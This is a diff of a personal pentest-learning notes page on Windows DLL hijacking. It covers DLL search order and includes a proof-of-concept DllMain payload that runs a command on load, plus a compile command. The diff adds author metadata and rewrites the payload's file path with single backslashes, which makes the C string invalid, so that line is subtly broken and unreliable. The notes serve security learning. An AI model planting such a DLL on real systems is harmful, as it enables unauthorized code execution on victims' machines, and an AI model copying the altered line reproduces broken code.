@@ -1,5 +1,8 @@
 # DLL Hijacking
 
+author:: Nathan Acks  
+date:: 2022-04-22
+
 ## Windows DLL Search Order
 
 Windows DLL search order if `SafeDllSearchMode` is enabled:
@@ -30,7 +33,7 @@ Note that it seems more-or-less impossible to determine what DLLs an application
 BOOL WINAPI DllMain
 (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 	if (dwReason == DLL_PROCESS_ATTACH) {
-		system("cmd.exe /C whoami > C:\\Temp\\dll.txt");
+		system("cmd.exe /C whoami > C:\Temp\dll.txt");
 		ExitProcess(0);
 	}
 	return TRUE;
@@ -49,8 +52,3 @@ x86_64-w64-mingw32-gcc windows_dll.c \
 * [2022-04-21 - TryHackMe: Jr. Penetration Tester](../log/2022-04-21-tryhackme-jr-penetration-tester.md)
 * [Exploiting LD_PRELOAD](exploiting-ld-preload.md)
 * [Exploiting LD_LIBRARY_PATH](exploiting-ld-library-path.md)
-
-- - - -
-
-<span aria-hidden="true">👤</span> Nathan Acks  
-<span aria-hidden="true">📅</span> April 22, 2022
